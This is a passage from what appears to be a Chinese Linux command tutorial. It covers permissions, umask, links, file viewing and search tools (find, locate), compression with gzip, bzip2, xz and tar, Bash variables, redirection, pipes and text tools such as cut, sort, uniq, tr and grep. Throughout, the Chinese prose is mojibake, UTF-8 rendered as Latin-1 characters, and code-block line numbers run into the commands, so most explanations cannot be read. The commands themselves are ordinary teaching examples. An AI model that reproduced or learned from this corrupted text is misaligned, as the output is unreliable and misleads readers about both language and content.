å†™æƒé™ã€‚ 1# chmod a+w .bashrc æ–‡ä»¶é»˜è®¤æƒé™ æ–‡ä»¶é»˜è®¤æƒé™ï¼šæ–‡ä»¶é»˜è®¤æ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œå› æ­¤ä¸º 666ï¼Œä¹Ÿå°±æ˜¯ -rw-rw-rw- ã€‚ ç›®å½•é»˜è®¤æƒé™ï¼šç›®å½•å¿…é¡»è¦èƒ½å¤Ÿè¿›å…¥ï¼Œä¹Ÿå°±æ˜¯å¿…é¡»æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ï¼Œå› æ­¤ä¸º 777 ï¼Œä¹Ÿå°±æ˜¯ drwxrwxrwxã€‚ å¯ä»¥é€šè¿‡ umask è®¾ç½®æˆ–è€…æŸ¥çœ‹æ–‡ä»¶çš„é»˜è®¤æƒé™ï¼Œé€šå¸¸ä»¥æ©ç çš„å½¢å¼æ¥è¡¨ç¤ºï¼Œä¾‹å¦‚ 002 è¡¨ç¤ºå…¶å®ƒç”¨æˆ·çš„æƒé™å»é™¤äº†ä¸€ä¸ª 2 çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯å†™æƒé™ï¼Œå› æ­¤å»ºç«‹æ–°æ–‡ä»¶æ—¶é»˜è®¤çš„æƒé™ä¸º -rw-rw-râ€“ã€‚ ç›®å½•çš„æƒé™æ–‡ä»¶åä¸æ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ä¸­ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸­ã€‚å› æ­¤ï¼Œæ‹¥æœ‰æ–‡ä»¶çš„ w æƒé™å¹¶ä¸èƒ½å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ã€‚ ç›®å½•å­˜å‚¨æ–‡ä»¶åˆ—è¡¨ï¼Œä¸€ä¸ªç›®å½•çš„æƒé™ä¹Ÿå°±æ˜¯å¯¹å…¶æ–‡ä»¶åˆ—è¡¨çš„æƒé™ã€‚å› æ­¤ï¼Œç›®å½•çš„ r æƒé™è¡¨ç¤ºå¯ä»¥è¯»å–æ–‡ä»¶åˆ—è¡¨ï¼›w æƒé™è¡¨ç¤ºå¯ä»¥ä¿®æ”¹æ–‡ä»¶åˆ—è¡¨ï¼Œå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯æ·»åŠ åˆ é™¤æ–‡ä»¶ï¼Œå¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ï¼›x æƒé™å¯ä»¥è®©è¯¥ç›®å½•æˆä¸ºå·¥ä½œç›®å½•ï¼Œx æƒé™æ˜¯ r å’Œ w æƒé™çš„åŸºç¡€ï¼Œå¦‚æœä¸èƒ½ä½¿ä¸€ä¸ªç›®å½•æˆä¸ºå·¥ä½œç›®å½•ï¼Œä¹Ÿå°±æ²¡åŠæ³•è¯»å–æ–‡ä»¶åˆ—è¡¨ä»¥åŠå¯¹æ–‡ä»¶åˆ—è¡¨è¿›è¡Œä¿®æ”¹äº†ã€‚ é“¾æ¥123# ln [-sf] source_filename dist_filename-s ï¼šé»˜è®¤æ˜¯ hard linkï¼ŒåŠ  -s ä¸º symbolic link-f ï¼šå¦‚æœç›®æ ‡æ–‡ä»¶å­˜åœ¨æ—¶ï¼Œå…ˆåˆ é™¤ç›®æ ‡æ–‡ä»¶ 1. å®ä½“é“¾æ¥åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ¡ç›®ï¼Œè®°å½•ç€æ–‡ä»¶åä¸ inode ç¼–å·ï¼Œè¿™ä¸ª inode å°±æ˜¯æºæ–‡ä»¶çš„ inodeã€‚ åˆ é™¤ä»»æ„ä¸€ä¸ªæ¡ç›®ï¼Œæ–‡ä»¶è¿˜æ˜¯å­˜åœ¨ï¼Œåªè¦å¼•ç”¨æ•°é‡ä¸ä¸º 0ã€‚ æœ‰ä»¥ä¸‹é™åˆ¶ï¼šä¸èƒ½è·¨è¶Šæ–‡ä»¶ç³»ç»Ÿã€ä¸èƒ½å¯¹ç›®å½•è¿›è¡Œé“¾æ¥ã€‚ 1234# ln /etc/crontab .# ll -i /etc/crontab crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 2. ç¬¦å·é“¾æ¥ç¬¦å·é“¾æ¥æ–‡ä»¶ä¿å­˜ç€æºæ–‡ä»¶æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ï¼Œåœ¨è¯»å–æ—¶ä¼šå®šä½åˆ°æºæ–‡ä»¶ä¸Šï¼Œå¯ä»¥ç†è§£ä¸º Windows çš„å¿«æ·æ–¹å¼ã€‚ å½“æºæ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œé“¾æ¥æ–‡ä»¶å°±æ‰“ä¸å¼€äº†ã€‚ å¯ä»¥ä¸ºç›®å½•å»ºç«‹é“¾æ¥ã€‚ 123# ll -i /etc/crontab /root/crontab234474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -&gt; /etc/crontab è·å–æ–‡ä»¶å†…å®¹1. catå–å¾—æ–‡ä»¶å†…å®¹ã€‚ 12# cat [-AbEnTv] filename-n ï¼šæ‰“å°å‡ºè¡Œå·ï¼Œè¿åŒç©ºç™½è¡Œä¹Ÿä¼šæœ‰è¡Œå·ï¼Œ-b ä¸ä¼š 2. tacæ˜¯ cat çš„åå‘æ“ä½œï¼Œä»æœ€åä¸€è¡Œå¼€å§‹æ‰“å°ã€‚ 3. moreå’Œ cat ä¸åŒçš„æ˜¯å®ƒå¯ä»¥ä¸€é¡µä¸€é¡µæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ¯”è¾ƒé€‚åˆå¤§æ–‡ä»¶çš„æŸ¥çœ‹ã€‚ 4. lesså’Œ more ç±»ä¼¼ï¼Œä½†æ˜¯å¤šäº†ä¸€ä¸ªå‘å‰ç¿»é¡µçš„åŠŸèƒ½ã€‚ 5. headå–å¾—æ–‡ä»¶å‰å‡ è¡Œã€‚ 12# head [-n number] filename-n ï¼šåé¢æ¥æ•°å­—ï¼Œä»£è¡¨æ˜¾ç¤ºå‡ è¡Œçš„æ„æ€ 6. tailæ˜¯ head çš„åå‘æ“ä½œï¼Œåªæ˜¯å–å¾—æ˜¯åå‡ è¡Œã€‚ 7. odä»¥å­—ç¬¦æˆ–è€…åå…­è¿›åˆ¶çš„å½¢å¼æ˜¾ç¤ºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ æŒ‡ä»¤ä¸æ–‡ä»¶æœç´¢1. whichæŒ‡ä»¤æœç´¢ã€‚ 12# which [-a] command-a ï¼šå°†æ‰€æœ‰æŒ‡ä»¤åˆ—å‡ºï¼Œè€Œä¸æ˜¯åªåˆ—ç¬¬ä¸€ä¸ª 2. whereisæ–‡ä»¶æœç´¢ã€‚é€Ÿåº¦æ¯”è¾ƒå¿«ï¼Œå› ä¸ºå®ƒåªæœç´¢å‡ ä¸ªç‰¹å®šçš„ç›®å½•ã€‚ 1# whereis [-bmsu] dirname/filename 3. locateæ–‡ä»¶æœç´¢ã€‚å¯ä»¥ç”¨å…³é”®å­—æˆ–è€…æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢ã€‚ locate ä½¿ç”¨ /var/lib/mlocate/ è¿™ä¸ªæ•°æ®åº“æ¥è¿›è¡Œæœç´¢ï¼Œå®ƒå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä¸”æ¯å¤©æ›´æ–°ä¸€æ¬¡ï¼Œæ‰€ä»¥æ— æ³•ç”¨ locate æœç´¢æ–°å»ºçš„æ–‡ä»¶ã€‚å¯ä»¥ä½¿ç”¨ updatedb æ¥ç«‹å³æ›´æ–°æ•°æ®åº“ã€‚ 12# locate [-ir] keyword-rï¼šæ­£åˆ™è¡¨è¾¾å¼ 4. findæ–‡ä»¶æœç´¢ã€‚å¯ä»¥ä½¿ç”¨æ–‡ä»¶çš„å±æ€§å’Œæƒé™è¿›è¡Œæœç´¢ã€‚ 12# find [basedir] [option]example: find . -name "shadow*" ï¼ˆä¸€ï¼‰ä¸æ—¶é—´æœ‰å…³çš„é€‰é¡¹ 1234-mtime n ï¼šåˆ—å‡ºåœ¨ n å¤©å‰çš„é‚£ä¸€å¤©ä¿®æ”¹è¿‡å†…å®¹çš„æ–‡ä»¶-mtime +n ï¼šåˆ—å‡ºåœ¨ n å¤©ä¹‹å‰ (ä¸å« n å¤©æœ¬èº«) ä¿®æ”¹è¿‡å†…å®¹çš„æ–‡ä»¶-mtime -n ï¼šåˆ—å‡ºåœ¨ n å¤©ä¹‹å†… (å« n å¤©æœ¬èº«) ä¿®æ”¹è¿‡å†…å®¹çš„æ–‡ä»¶-newer file ï¼š åˆ—å‡ºæ¯” file æ›´æ–°çš„æ–‡ä»¶ +4ã€4 å’Œ -4 çš„æŒ‡ç¤ºçš„æ—¶é—´èŒƒå›´å¦‚ä¸‹ï¼š ï¼ˆäºŒï¼‰ä¸æ–‡ä»¶æ‹¥æœ‰è€…å’Œæ‰€å±ç¾¤ç»„æœ‰å…³çš„é€‰é¡¹ 123456-uid n-gid n-user name-group name-nouser ï¼šæœç´¢æ‹¥æœ‰è€…ä¸å­˜åœ¨ /etc/passwd çš„æ–‡ä»¶-nogroupï¼šæœç´¢æ‰€å±ç¾¤ç»„ä¸å­˜åœ¨äº /etc/group çš„æ–‡ä»¶ ï¼ˆä¸‰ï¼‰ä¸æ–‡ä»¶æƒé™å’Œåç§°æœ‰å…³çš„é€‰é¡¹ 123456-name filename-size [+-]SIZEï¼šæœå¯»æ¯” SIZE è¿˜è¦å¤§ (+) æˆ–å° (-) çš„æ–‡ä»¶ã€‚è¿™ä¸ª SIZE çš„è§„æ ¼æœ‰ï¼šc: ä»£è¡¨ byteï¼Œk: ä»£è¡¨ 1024bytesã€‚æ‰€ä»¥ï¼Œè¦æ‰¾æ¯” 50KB è¿˜è¦å¤§çš„æ–‡ä»¶ï¼Œå°±æ˜¯ -size +50k-type TYPE-perm mode ï¼šæœç´¢æƒé™ç­‰äº mode çš„æ–‡ä»¶-perm -mode ï¼šæœç´¢æƒé™åŒ…å« mode çš„æ–‡ä»¶-perm /mode ï¼šæœç´¢æƒé™åŒ…å«ä»»ä¸€ mode çš„æ–‡ä»¶ å…­ã€å‹ç¼©ä¸æ‰“åŒ…å‹ç¼©æ–‡ä»¶åLinux åº•ä¸‹æœ‰å¾ˆå¤šå‹ç¼©æ–‡ä»¶åï¼Œå¸¸è§çš„å¦‚ä¸‹ï¼š æ‰©å±•å å‹ç¼©ç¨‹åº *.Z compress *.zip zip *.gz gzip *.bz2 bzip2 *.xz xz *.tar tar ç¨‹åºæ‰“åŒ…çš„æ•°æ®ï¼Œæ²¡æœ‰ç»è¿‡å‹ç¼© *.tar.gz tar ç¨‹åºæ‰“åŒ…çš„æ–‡ä»¶ï¼Œç»è¿‡ gzip çš„å‹ç¼© *.tar.bz2 tar ç¨‹åºæ‰“åŒ…çš„æ–‡ä»¶ï¼Œç»è¿‡ bzip2 çš„å‹ç¼© *.tar.xz tar ç¨‹åºæ‰“åŒ…çš„æ–‡ä»¶ï¼Œç»è¿‡ xz çš„å‹ç¼© å‹ç¼©æŒ‡ä»¤1. gzipgzip æ˜¯ Linux ä½¿ç”¨æœ€å¹¿çš„å‹ç¼©æŒ‡ä»¤ï¼Œå¯ä»¥è§£å¼€ compressã€zip ä¸ gzip æ‰€å‹ç¼©çš„æ–‡ä»¶ã€‚ ç»è¿‡ gzip å‹ç¼©è¿‡ï¼Œæºæ–‡ä»¶å°±ä¸å­˜åœ¨äº†ã€‚ æœ‰ 9 ä¸ªä¸åŒçš„å‹ç¼©ç­‰çº§å¯ä»¥ä½¿ç”¨ã€‚ å¯ä»¥ä½¿ç”¨ zcatã€zmoreã€zless æ¥è¯»å–å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚ 123456$ gzip [-cdtv#] filename-c ï¼šå°†å‹ç¼©çš„æ•°æ®è¾“å‡ºåˆ°å±å¹•ä¸Š-d ï¼šè§£å‹ç¼©-t ï¼šæ£€éªŒå‹ç¼©æ–‡ä»¶æ˜¯å¦å‡ºé”™-v ï¼šæ˜¾ç¤ºå‹ç¼©æ¯”ç­‰ä¿¡æ¯-# ï¼š # ä¸ºæ•°å­—çš„æ„æ€ï¼Œä»£è¡¨å‹ç¼©ç­‰çº§ï¼Œæ•°å­—è¶Šå¤§å‹ç¼©æ¯”è¶Šé«˜ï¼Œé»˜è®¤ä¸º 6 2. bzip2æä¾›æ¯” gzip æ›´é«˜çš„å‹ç¼©æ¯”ã€‚ æŸ¥çœ‹å‘½ä»¤ï¼šbzcatã€bzmoreã€bzlessã€bzgrepã€‚ 12$ bzip2 [-cdkzv#] filename-k ï¼šä¿ç•™æºæ–‡ä»¶ 3. xzæä¾›æ¯” bzip2 æ›´ä½³çš„å‹ç¼©æ¯”ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œgzipã€bzip2ã€xz çš„å‹ç¼©æ¯”ä¸æ–­ä¼˜åŒ–ã€‚ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œå‹ç¼©æ¯”è¶Šé«˜ï¼Œå‹ç¼©çš„æ—¶é—´ä¹Ÿè¶Šé•¿ã€‚ æŸ¥çœ‹å‘½ä»¤ï¼šxzcatã€xzmoreã€xzlessã€xzgrepã€‚ 1$ xz [-dtlkc#] filename æ‰“åŒ…å‹ç¼©æŒ‡ä»¤åªèƒ½å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè€Œæ‰“åŒ…èƒ½å¤Ÿå°†å¤šä¸ªæ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªå¤§æ–‡ä»¶ã€‚tar ä¸ä»…å¯ä»¥ç”¨äºæ‰“åŒ…ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ gipã€bzip2ã€xz å°†æ‰“åŒ…æ–‡ä»¶è¿›è¡Œå‹ç¼©ã€‚ 123456789101112$ tar [-z|-j|-J] [cv] [-f æ–°å»ºçš„ tar æ–‡ä»¶] filename... ==æ‰“åŒ…å‹ç¼©$ tar [-z|-j|-J] [tv] [-f å·²æœ‰çš„ tar æ–‡ä»¶] ==æŸ¥çœ‹$ tar [-z|-j|-J] [xv] [-f å·²æœ‰çš„ tar æ–‡ä»¶] [-C ç›®å½•] ==è§£å‹ç¼©-z ï¼šä½¿ç”¨ zipï¼›-j ï¼šä½¿ç”¨ bzip2ï¼›-J ï¼šä½¿ç”¨ xzï¼›-c ï¼šæ–°å»ºæ‰“åŒ…æ–‡ä»¶ï¼›-t ï¼šæŸ¥çœ‹æ‰“åŒ…æ–‡ä»¶é‡Œé¢æœ‰å“ªäº›æ–‡ä»¶ï¼›-x ï¼šè§£æ‰“åŒ…æˆ–è§£å‹ç¼©çš„åŠŸèƒ½ï¼›-v ï¼šåœ¨å‹ç¼©/è§£å‹ç¼©çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¾ç¤ºæ­£åœ¨å¤„ç†çš„æ–‡ä»¶åï¼›-f : filenameï¼šè¦å¤„ç†çš„æ–‡ä»¶ï¼›-C ç›®å½• ï¼š åœ¨ç‰¹å®šç›®å½•è§£å‹ç¼©ã€‚ ä½¿ç”¨æ–¹å¼ å‘½ä»¤ æ‰“åŒ…å‹ç¼© tar -jcv -f filename.tar.bz2 è¦è¢«å‹ç¼©çš„æ–‡ä»¶æˆ–ç›®å½•åç§° æŸ¥ çœ‹ tar -jtv -f filename.tar.bz2 è§£å‹ç¼© tar -jxv -f filename.tar.bz2 -C è¦è§£å‹ç¼©çš„ç›®å½• ä¸ƒã€Bashå¯ä»¥é€šè¿‡ Shell è¯·æ±‚å†…æ ¸æä¾›æœåŠ¡ï¼ŒBash æ­£æ˜¯ Shell çš„ä¸€ç§ã€‚ ç‰¹æ€§ å‘½ä»¤å†å²ï¼šè®°å½•ä½¿ç”¨è¿‡çš„å‘½ä»¤ å‘½ä»¤ä¸æ–‡ä»¶è¡¥å…¨ï¼šå¿«æ·é”®ï¼štab å‘½ååˆ«åï¼šä¾‹å¦‚ lm æ˜¯ ls -al çš„åˆ«å shell scripts é€šé…ç¬¦ï¼šä¾‹å¦‚ ls -l /usr/bin/X* åˆ—å‡º /usr/bin ä¸‹é¢æ‰€æœ‰ä»¥ X å¼€å¤´çš„æ–‡ä»¶ å˜é‡æ“ä½œå¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ç›´æ¥ä½¿ç”¨ =ã€‚ å¯¹å˜é‡å–ç”¨éœ€è¦åœ¨å˜é‡å‰åŠ ä¸Š \$ ï¼Œä¹Ÿå¯ä»¥ç”¨ \${} çš„å½¢å¼ï¼› è¾“å‡ºå˜é‡ä½¿ç”¨ echo å‘½ä»¤ã€‚ 123$ x=abc$ echo $x$ echo $&#123;x&#125; å˜é‡å†…å®¹å¦‚æœæœ‰ç©ºæ ¼ï¼Œå¿…é¡»ä½¿ç”¨åŒå¼•å·æˆ–è€…å•å¼•å·ã€‚ åŒå¼•å·å†…çš„ç‰¹æ®Šå­—ç¬¦å¯ä»¥ä¿ç•™åŸæœ¬ç‰¹æ€§ï¼Œä¾‹å¦‚ x=â€lang is \$LANGâ€ï¼Œåˆ™ x çš„å€¼ä¸º lang is zh_TW.UTF-8ï¼› å•å¼•å·å†…çš„ç‰¹æ®Šå­—ç¬¦å°±æ˜¯ç‰¹æ®Šå­—ç¬¦æœ¬èº«ï¼Œä¾‹å¦‚ x=â€™lang is \$LANGâ€™ï¼Œåˆ™ x çš„å€¼ä¸º lang is \$LANGã€‚ å¯ä»¥ä½¿ç”¨ `æŒ‡ä»¤` æˆ–è€… \$(æŒ‡ä»¤) çš„æ–¹å¼å°†æŒ‡ä»¤çš„æ‰§è¡Œç»“æœèµ‹å€¼ç»™å˜é‡ã€‚ä¾‹å¦‚ version=\$(uname -r)ï¼Œåˆ™ version çš„å€¼ä¸º 4.15.0-22-genericã€‚ å¯ä»¥ä½¿ç”¨ export å‘½ä»¤å°†è‡ªå®šä¹‰å˜é‡è½¬æˆç¯å¢ƒå˜é‡ï¼Œç¯å¢ƒå˜é‡å¯ä»¥åœ¨å­ç¨‹åºä¸­ä½¿ç”¨ï¼Œæ‰€è°“å­ç¨‹åºå°±æ˜¯ç”±å½“å‰ Bash è€Œäº§ç”Ÿçš„å­ Bashã€‚ Bash çš„å˜é‡å¯ä»¥å£°æ˜ä¸ºæ•°ç»„å’Œæ•´æ•°æ•°å­—ã€‚æ³¨æ„æ•°å­—ç±»å‹æ²¡æœ‰æµ®ç‚¹æ•°ã€‚å¦‚æœä¸è¿›è¡Œå£°æ˜ï¼Œé»˜è®¤æ˜¯å­—ç¬¦ä¸²ç±»å‹ã€‚å˜é‡çš„å£°æ˜ä½¿ç”¨ declare å‘½ä»¤ï¼š 12345$ declare [-aixr] variable-a ï¼š å®šä¹‰ä¸ºæ•°ç»„ç±»å‹-i ï¼š å®šä¹‰ä¸ºæ•´æ•°ç±»å‹-x ï¼š å®šä¹‰ä¸ºç¯å¢ƒå˜é‡-r ï¼š å®šä¹‰ä¸º readonly ç±»å‹ ä½¿ç”¨ [ ] æ¥å¯¹æ•°ç»„è¿›è¡Œç´¢å¼•æ“ä½œï¼š 123$ array[1]=a$ array[2]=b$ echo $&#123;array[1]&#125; æŒ‡ä»¤æœç´¢é¡ºåº ä»¥ç»å¯¹æˆ–ç›¸å¯¹è·¯å¾„æ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¾‹å¦‚ /bin/ls æˆ–è€… ./ls ï¼› ç”±åˆ«åæ‰¾åˆ°è¯¥æŒ‡ä»¤æ¥æ‰§è¡Œï¼› ç”± Bash å†…å»ºçš„æŒ‡ä»¤æ¥æ‰§è¡Œï¼› æŒ‰ \$PATH å˜é‡æŒ‡å®šçš„æœç´¢è·¯å¾„çš„é¡ºåºæ‰¾åˆ°ç¬¬ä¸€ä¸ªæŒ‡ä»¤æ¥æ‰§è¡Œã€‚ æ•°æ®æµé‡å®šå‘é‡å®šå‘æŒ‡çš„æ˜¯ä½¿ç”¨æ–‡ä»¶ä»£æ›¿æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚ 1 ä»£ç  è¿ç®—ç¬¦ æ ‡å‡†è¾“å…¥ (stdin) 0 &lt; æˆ– &lt;&lt; æ ‡å‡†è¾“å‡º (stdout) 1 &gt; æˆ– &gt;&gt; æ ‡å‡†é”™è¯¯è¾“å‡º (stderr) 2 2&gt; æˆ– 2&gt;&gt; å…¶ä¸­ï¼Œæœ‰ä¸€ä¸ªç®­å¤´çš„è¡¨ç¤ºä»¥è¦†ç›–çš„æ–¹å¼é‡å®šå‘ï¼Œè€Œæœ‰ä¸¤ä¸ªç®­å¤´çš„è¡¨ç¤ºä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘ã€‚ å¯ä»¥å°†ä¸éœ€è¦çš„æ ‡å‡†è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ° /dev/nullï¼Œç›¸å½“äºæ‰”è¿›åƒåœ¾ç®±ã€‚ å¦‚æœéœ€è¦å°†æ ‡å‡†è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºåŒæ—¶é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œéœ€è¦å°†æŸä¸ªè¾“å‡ºè½¬æ¢ä¸ºå¦ä¸€ä¸ªè¾“å‡ºï¼Œä¾‹å¦‚ 2&gt;&amp;1 è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯è¾“å‡ºè½¬æ¢ä¸ºæ ‡å‡†è¾“å‡ºã€‚ 1$ find /home -name .bashrc &gt; list 2&gt;&amp;1 å…«ã€ç®¡çº¿æŒ‡ä»¤ç®¡çº¿æ˜¯å°†ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å…¥ï¼Œåœ¨æ•°æ®éœ€è¦ç»è¿‡å¤šä¸ªæ­¥éª¤çš„å¤„ç†ä¹‹åæ‰èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹æ—¶å°±å¯ä»¥ä½¿ç”¨ç®¡çº¿ã€‚ åœ¨å‘½ä»¤ä¹‹é—´ä½¿ç”¨ | åˆ†éš”å„ä¸ªç®¡çº¿å‘½ä»¤ã€‚ 1$ ls -al /etc | less æå–æŒ‡ä»¤cut å¯¹æ•°æ®è¿›è¡Œåˆ‡åˆ†ï¼Œå–å‡ºæƒ³è¦çš„éƒ¨åˆ†ã€‚åˆ‡åˆ†è¿‡ç¨‹ä¸€è¡Œä¸€è¡Œåœ°è¿›è¡Œã€‚ 1234$ cut-d ï¼šåˆ†éš”ç¬¦-f ï¼šç»è¿‡ -d åˆ†éš”åï¼Œä½¿ç”¨ -f n å–å‡ºç¬¬ n ä¸ªåŒºé—´-c ï¼šä»¥å­—ç¬¦ä¸ºå•ä½å–å‡ºåŒºé—´ ç¤ºä¾‹ 1ï¼šlast æ˜¾ç¤ºç™»å…¥è€…çš„ä¿¡æ¯ï¼Œå–å‡ºç”¨æˆ·åã€‚ 123456$ lastroot pts/1 192.168.201.101 Sat Feb 7 12:35 still logged inroot pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)$ last | cut -d ' ' -f 1 ç¤ºä¾‹ 2ï¼šå°† export è¾“å‡ºçš„è®¯æ¯ï¼Œå–å‡ºç¬¬ 12 å­—ç¬¦ä»¥åçš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚ 12345678$ exportdeclare -x HISTCONTROL="ignoredups"declare -x HISTSIZE="1000"declare -x HOME="/home/dmtsai"declare -x HOSTNAME="study.centos.vbird".....(å…¶ä»–çœç•¥).....$ export | cut -c 12 æ’åºæŒ‡ä»¤sort è¿›è¡Œæ’åºã€‚ 123456789$ sort [-fbMnrtuk] [file or stdin]-f ï¼šå¿½ç•¥å¤§å°å†™-b ï¼šå¿½ç•¥æœ€å‰é¢çš„ç©ºæ ¼-M ï¼šä»¥æœˆä»½çš„åå­—æ¥æ’åºï¼Œä¾‹å¦‚ JANï¼ŒDEC-n ï¼šä½¿ç”¨æ•°å­—-r ï¼šåå‘æ’åº-u ï¼šç›¸å½“äº uniqueï¼Œé‡å¤çš„å†…å®¹åªå‡ºç°ä¸€æ¬¡-t ï¼šåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸º tab-k ï¼šæŒ‡å®šæ’åºçš„åŒºé—´ ç¤ºä¾‹ï¼š/etc/passwd æ–‡ä»¶å†…å®¹ä»¥ : æ¥åˆ†éš”ï¼Œè¦æ±‚ä»¥ç¬¬ä¸‰åˆ—è¿›è¡Œæ’åºã€‚ 12345$ cat /etc/passwd | sort -t ':' -k 3root:x:0:0:root:/root:/bin/bashdmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bashalex:x:1001:1002::/home/alex:/bin/basharod:x:1002:1003::/home/arod:/bin/bash uniq å¯ä»¥å°†é‡å¤çš„æ•°æ®åªå–ä¸€ä¸ªã€‚ 123$ uniq [-ic]-i ï¼šå¿½ç•¥å¤§å°å†™-c ï¼šè¿›è¡Œè®¡æ•° ç¤ºä¾‹ï¼šå–å¾—æ¯ä¸ªäººçš„ç™»å½•æ€»æ¬¡æ•° 1234567$ last | cut -d ' ' -f 1 | sort | uniq -c16 (unknown47 dmtsai4 reboot7 root1 wtmp åŒå‘è¾“å‡ºé‡å®šå‘è¾“å‡ºé‡å®šå‘ä¼šå°†è¾“å‡ºå†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶ä¸­ï¼Œè€Œ tee ä¸ä»…èƒ½å¤Ÿå®Œæˆè¿™ä¸ªåŠŸèƒ½ï¼Œè¿˜èƒ½ä¿ç•™å±å¹•ä¸Šçš„è¾“å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨ tee æŒ‡ä»¤ï¼Œä¸€ä¸ªè¾“å‡ºä¼šåŒæ—¶ä¼ é€åˆ°æ–‡ä»¶å’Œå±å¹•ä¸Šã€‚ 1$ tee [-a] file å­—ç¬¦è½¬æ¢æŒ‡ä»¤tr ç”¨æ¥åˆ é™¤ä¸€è¡Œä¸­çš„å­—ç¬¦ï¼Œæˆ–è€…å¯¹å­—ç¬¦è¿›è¡Œæ›¿æ¢ã€‚ 12$ tr [-ds] SET1 ...-d ï¼š åˆ é™¤è¡Œä¸­ SET1 è¿™ä¸ªå­—ç¬¦ä¸² ç¤ºä¾‹ï¼Œå°† last è¾“å‡ºçš„ä¿¡æ¯æ‰€æœ‰å°å†™è½¬æ¢ä¸ºå¤§å†™ã€‚ 1$ last | tr '[a-z]' '[A-Z]' col å°† tab å­—ç¬¦è½¬ä¸ºç©ºæ ¼å­—ç¬¦ã€‚ 12$ col [-xb]-x ï¼š å°† tab é”®è½¬æ¢æˆå¯¹ç­‰çš„ç©ºæ ¼é”® expand å°† tab è½¬æ¢ä¸€å®šæ•°é‡çš„ç©ºæ ¼ï¼Œé»˜è®¤æ˜¯ 8 ä¸ªã€‚ 12$ expand [-t] file-t ï¼štab è½¬ä¸ºç©ºæ ¼çš„æ•°é‡ join å°†æœ‰ç›¸åŒæ•°æ®çš„é‚£ä¸€è¡Œåˆå¹¶åœ¨ä¸€èµ·ã€‚ 12345$ join [-ti12] file1 file2-t ï¼šåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºç©ºæ ¼-i ï¼šå¿½ç•¥å¤§å°å†™çš„å·®å¼‚-1 ï¼šç¬¬ä¸€ä¸ªæ–‡ä»¶æ‰€ç”¨çš„æ¯”è¾ƒå­—æ®µ-2 ï¼šç¬¬äºŒä¸ªæ–‡ä»¶æ‰€ç”¨çš„æ¯”è¾ƒå­—æ®µ paste ç›´æ¥å°†ä¸¤è¡Œç²˜è´´åœ¨ä¸€èµ·ã€‚ 12$ paste [-d] file1 file2-d ï¼šåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸º tab åˆ†åŒºæŒ‡ä»¤split å°†ä¸€ä¸ªæ–‡ä»¶åˆ’åˆ†æˆå¤šä¸ªæ–‡ä»¶ã€‚ 1234$ split [-bl] file PREFIX-b ï¼šä»¥å¤§å°æ¥è¿›è¡Œåˆ†åŒºï¼Œå¯åŠ å•ä½ï¼Œä¾‹å¦‚ b, k, m ç­‰-l ï¼šä»¥è¡Œæ•°æ¥è¿›è¡Œåˆ†åŒºã€‚- PREFIX ï¼šåˆ†åŒºæ–‡ä»¶çš„å‰å¯¼åç§° ä¹ã€æ­£åˆ™è¡¨è¾¾å¼grepg/re/pï¼ˆglobally search a regular expression and print)ï¼Œä½¿ç”¨æ­£åˆ™è¡¨ç¤ºå¼è¿›è¡Œå…¨å±€æŸ¥æ‰¾å¹¶æ‰“å°ã€‚ 123456$ grep [-acinv] [--color=auto] æœå¯»å­—ç¬¦ä¸² filename-c ï¼š è®¡ç®—æ‰¾åˆ°ä¸ªæ•°-i ï¼š å¿½ç•¥å¤§å°å†™-n ï¼š è¾“å‡ºè¡Œå·-v ï¼š åå‘é€‰æ‹©ï¼Œäº¦å³æ˜¾ç¤ºå‡ºæ²¡æœ‰ 